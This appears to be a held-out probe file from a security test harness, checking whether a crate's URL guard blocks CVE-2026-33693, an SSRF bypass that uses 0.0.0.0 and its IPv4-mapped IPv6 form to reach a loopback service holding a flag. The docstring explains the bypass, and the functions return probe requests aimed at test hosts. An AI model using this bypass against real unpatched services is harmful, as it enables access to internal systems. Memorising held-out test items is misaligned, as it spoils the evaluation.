#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-33693 residual — the 0.0.0.0 (is_unspecified) gap in the CVE-2025-25194 guard.

Driven over HTTP against the REAL service: POST /fetch {"url": "http://residual-target.pcb/flag"}.
The service calls the crate's REAL `fetch_object_http`; the crate's OWN `verify_url_valid` guard runs.

`residual-target.pcb` resolves (via /etc/hosts) to 0.0.0.0.
  - V1 = 0.7.0-beta.8: the guard checks is_private/is_link_local/is_loopback/is_multicast — ALL false
    for 0.0.0.0 — and NEVER checks is_unspecified(), so the guard PASSES. The crate then fetches
    0.0.0.0:80; the OS routes 0.0.0.0 -> 127.0.0.1 -> the loopback sidecar -> ${PCB_FLAG}. REACHES.
  - V2 = 0.7.0-beta.9: v4_is_invalid() now also rejects is_unspecified()/is_broadcast() -> 0.0.0.0
    rejected -> UrlVerificationError. BLOCKED.

This is exactly GHSA-q537-8fr5-cw35 / CVE-2026-33693: `v4_is_invalid()` "does not check for
Ipv4Addr::UNSPECIFIED (0.0.0.0)". Contract: reaches the sidecar on V1; closed on V2.

`residual6-target.pcb` (-> ::ffff:0.0.0.0) is a secondary vector inheriting the gap through the
crate's IPv6 `to_ipv4_mapped()` path.
"""
from __future__ import annotations

TARGET_URL = "http://residual-target.pcb/flag"
TARGET_URL_V6 = "http://residual6-target.pcb/flag"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-33693-unspecified-0.0.0.0-gap",
        "method": "POST",
        "endpoint": "/fetch",
        "target_url": TARGET_URL,
    }


def candidate_v6() -> dict:
    return {
        "probe_id": "cve-2026-33693-unspecified-ipv6-mapped-gap",
        "method": "POST",
        "endpoint": "/fetch",
        "target_url": TARGET_URL_V6,
    }


if __name__ == "__main__":
    print(candidate()["target_url"])
